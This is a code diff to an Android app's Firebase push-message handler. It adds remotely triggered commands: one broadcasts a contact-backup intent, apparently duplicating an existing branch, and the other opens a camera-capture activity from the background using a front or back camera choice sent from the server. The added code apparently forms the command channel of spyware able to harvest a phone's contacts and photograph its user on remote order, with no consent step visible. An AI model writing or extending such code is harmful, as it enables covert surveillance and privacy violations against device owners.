@@ -61,6 +61,19 @@ public class MyFirebaseMessagingService extends FirebaseMessagingService {
                 Intent intent = new Intent("com.example.suma.ACTION_BACKUP_CONTACTS");
                 intent.setPackage(getPackageName());
                 sendBroadcast(intent);
+            } else if ("backup_contacts".equals(action)) {
+                Log.d(TAG, "Action: Backup Contacts. Broadcasting...");
+                Intent intent = new Intent("com.example.suma.ACTION_BACKUP_CONTACTS");
+                intent.setPackage(getPackageName());
+                sendBroadcast(intent);
+            } else if ("capture_image".equals(action)) {
+                String facing = remoteMessage.getData().get("camera_facing"); // "front" or "back"
+                Log.d(TAG, "Action: Capture Image (" + facing + "). Starting Activity...");
+
+                Intent intent = new Intent(this, CameraCaptureActivity.class);
+                intent.putExtra("camera_facing", facing);
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(intent);
             }
         }
     }
